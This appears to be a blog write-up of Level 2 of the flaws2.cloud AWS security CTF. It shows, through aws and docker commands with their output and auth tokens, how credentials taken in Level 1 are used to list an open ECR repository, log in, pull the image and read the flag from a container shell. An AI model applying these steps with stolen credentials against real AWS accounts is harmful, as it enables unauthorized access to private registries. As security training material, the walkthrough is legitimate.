---
title: Attacker - Level 2
---

The next level is at <a href="[http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud](http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud/)"

## Level 2 challenge

This next level is running as a container at [**http://container.target.flaws2.cloud/**](http://container.target.flaws2.cloud/). Just like S3 buckets, other resources on AWS can have open permissions. I'll give you a hint that the ECR (Elastic Container Registry) is named "level2".

### Enumeration
Since we already know it is running on a Container service on AWS, I will assume `ECR`. ECR is AWS Elastic Container Registry, it is a fully managed container registry offering high-performance hosting, so you can reliably deploy application images and artifacts anywhere.
<div class="iframely-embed"><div class="iframely-responsive" style="height: 140px; padding-bottom: 0;"><a href="https://aws.amazon.com/ecr/" data-iframely-url="https://iframely.net/p7ow7JYS?theme=dark"></a></div></div><script async src="https://iframely.net/embed.js"></script>

I will enumerate for ECR images using the `Compromised credentials` from `Level One`.

```bash
aws ecr describe-images \
    --repository-name level2 | jq
{
  "imageDetails": [
    {
      "registryId": "653711331788",
      "repositoryName": "level2",
      "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
      "imageTags": [
        "latest"
      ],
      "imageSizeInBytes": 75937660,
      "imagePushedAt": "2018-11-26T22:34:16-05:00",
      "imageManifestMediaType": "application/vnd.docker.distribution.manifest.v2+json",
      "lastRecordedPullTime": "2026-02-18T15:38:24.328000-05:00",
      "imageStatus": "ACTIVE"
    }
  ]
}
```
__Found:__
- RegistryId and
- repositionoryName

Let me check whether I can get a `Valid Authorization Token`.

```bash
aws ecr get-authorization-token | jq
{
  "authorizationData": [
    {
      "authorizationToken": "QVdTOmV5SndZWGxzYjJGa0lqb2labFUzVDJ0NlNrbENjMk52YVcxdWRqVXlaalp1UWl0b1VWTk1PVWRuWjFremNXZDNTMUV2VUVoUlkyZ3paM05oWlRGU0wzQlhSV1V3V0c5RU56TnNSbEZDZVc1cVVXdHBPVlp4UlhOTlNVczFZVEZPU0RGaGNtRnpVbXRvTHl0MlpXcG9OSGxSYTJaRFQzQXlUVWRDVGxaTk9HMXhMMnRSYTBacVlXeGpORTU2VVRFd01WbFVZMnQ1TUhWcFpuUkdUWEZMT0RkMVoyTmtXVXRYVTNsT1ZHeHFjR1puYUVwUlNGbG1iRUpoWlVrelZrVlFhbU5IWjBGU2RXUm9lbUkyY1haWlFVbFpaa1pRYlRVMGNIbGtka3BJVm5wUE1XSXpObmhWV0VOak1XMXBjelJJT1RWblJFSjJOMGxRY0ZwS2IwSnFPSGxZY20xa1p6SkZNREp4UzA4ek0xcGxlSEpJVDJJeGVHcDZXRWw0VVZGdmF6QkpTbTk0WlM4elIxSkRNRWxyTDJ4R1ZHODJaRzFvTTFoUFlsbDVjMk5vTDNnelRuTm5aREJ",
      "expiresAt": "2026-02-19T06:02:58.949000-05:00",
      "proxyEndpoint": "https://653711331788.dkr.ecr.us-east-1.amazonaws.com"
    }
  ]
}
```
I now have the `ProxyEndpoint`: "https://653711331788.dkr.ecr.us-east-1.amazonaws.com"

You can get a Login credential, if your user has permission to login to that specific `ecr`. Let's try that out!!!

```bash
aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 653711331788.dkr.ecr.us-east-1.amazonaws.com
WARNING! Your password will be stored unencrypted in /home/kali/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credential-stores

Login Succeeded
```

Once Login is successful, you can go to ~/.docker/config.json to view the Auth Token

```bash
File: .docker/config.json
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ {
   2   │     "auths": {
   3   │         "653711331788.dkr.ecr.us-east-1.amazonaws.com": {
   4   │             "auth": "QVdTOmV5SndZWGxzYjJGa0lqb2lUMDVZVDI1dGQwYzNSMnBNYVdSeldsTkNWRXhhV2xVMWVHRmtia3RLTDAxcWNIQXdkM056WW5WRVNre
       │ EVWSE4wWjI1SE5YaEpXRFE1Yms1SlpHNWFlbk51V0dsdFNFaEhNMGczVDI5dVZHaDNTVEpLT1hsc1p6bEpSVFJRZWxveVlXdEdlWFJzZVV0UlFuVXZSWEl6ZERJcld
       │ sQlpVRFZIZFZwR1RVNXdNVFJwTWk5RFYzWmliVEJLUzJkTlltbFNUR2Q0Vml0Mk9WVkpSMmxSTUdrMVRHUTRWVmx1YXpsbU9XOUVWVTg0WVRKek1rbGFaV2s0VFUxW
       │ GJrOTNWMlJNVTJkVVdWYzFPRlkwSzBsMVZGcFBjSGgwTUZjNFEzWTRVMkpLUVdJdmVHRkVSV1pJZEZGVGFpdFBlakY2U2xSM2RWVm1lWFZTUTJOM1JFRk9iSG8yTDF
       │ Kc1owTlJObkJ3VGxKcFYxcEVUMFJvY3poVmRYcG1hRVF2YUZsdmMyOVViemRCV2xSWlZTdHhTbkIyTjJkSFJVRXZkVzVUSzBoTEszVm1lWFJ3YlRCRlFtbFdWRmhVV
       │ lVoSVYzZHJUVWxJU20xM2FYTkVhMlI1Y0U5R1RHazJka3d3WjFvNGNIVlZUMjVxVWxFdk4yaDRSREZPTmxRdmRYRm1aVkZTWm1aVWN6VXdMMFJXYVZOYVJ6bHFOVFo
       | << SNIP FOR BREVITY >>
   5   │         }
   6   │     }
   7   │ }
───────┴────
```

Using a valid auth token and having the required IAM permissions, we can now pull the ecr image locally.

```bash
docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
latest: Pulling from level2
7b8b6451c85f: Pull complete 
ab4d1096d9ba: Pull complete 
e6797d1788ac: Pull complete 
e25c5c290bde: Pull complete 
96af0e137711: Pull complete 
2057ef5841b5: Pull complete 
e4206c7b02ec: Pull complete 
501f2d39ea31: Pull complete 
f90fb73d877d: Pull complete 
4fbdfdaee9ae: Pull complete 
Digest: sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e
Status: Downloaded newer image for 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
```

Use the below commands to gain an `interactive` shell on the container.

```bash
docker run -ti -p8000:8000 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest sh
# ls
bin  boot  dev	etc  home  lib	lib64  media  mnt  opt	proc  root  run  sbin  srv  sys  tmp  usr  var
```
Move to `/var/www/html/` and get open `index.htm` to view the `flag`.

```bash
cd /var/www
# ls
html
# cd html
# ls
index.htm  index.nginx-debian.html  proxy.py  start.sh
# cat index.htm
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <meta name="description" content="AWS Security training">
    <meta name="keywords" content="aws,security,ctf,amazon,enterprise,defense,infosec,cyber,flaws2">
    <title>flAWS2.cloud</title>
    
    <link href="http://flaws2.cloud/css/bootstrap.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet">
    <link href="http://flaws2.cloud/css/summitroute.css" rel="stylesheet">

    <link rel="icon" href="/favicon.ico" sizes="16x16 32x32 64x64" type="image/vnd.microsoft.icon">
</head>

<body>
    <div class="stretchforfooter">
        <div class="container">
            <nav class="navbar navbar-default" role="navigation">
                <div class="navbar-header">
                    <a class="navbar-brand" href="/"></a>
                </div>
                <div>
                    <ul class="nav navbar-nav navbar-right">
                        <li>
                            <a href="http://flaws2.cloud" class="hvr-overline-from-center">flaws2.cloud</a>
                        </li>
                    </ul>
                </div>
            </nav>
        </div>

        <hr class="gradient">

        <div class="content-section-a">
          <div class="container">
    <div class="row">
        <div class="col-sm-8 col-sm-offset-2">

<div class="content">
    <div class="row">
        <div class="col-sm-12">
            <center><h1>Level 3</h1></center>
            <hr>
            Read about Level 3 at <a href="http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud">level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud</a>
            <p>

        </div>
    </div>
</div>



</body>
</html>
```
Click to head over to [Level 3](http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud) ------------>
